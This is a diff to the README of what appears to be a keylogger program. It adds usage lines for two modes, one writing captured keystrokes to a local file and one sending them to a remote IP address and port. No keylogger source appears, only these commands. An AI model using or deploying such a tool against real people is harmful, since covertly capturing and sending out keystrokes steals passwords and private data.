@@ -16,6 +16,8 @@ This program propose 2 types of keylogger
 
 Store entry into file on the current computer
 
+./bin/main.exe -l destionation_file
+
 Example
 
 ```
@@ -26,6 +28,8 @@ Example
 
 Send entry to another computer
 
+./bin/main.exe -r ip_address port
+
 Example
 
 ```
@@ -35,5 +39,3 @@ Example
 TODO
 
 ## Parameters
-
-### Optional
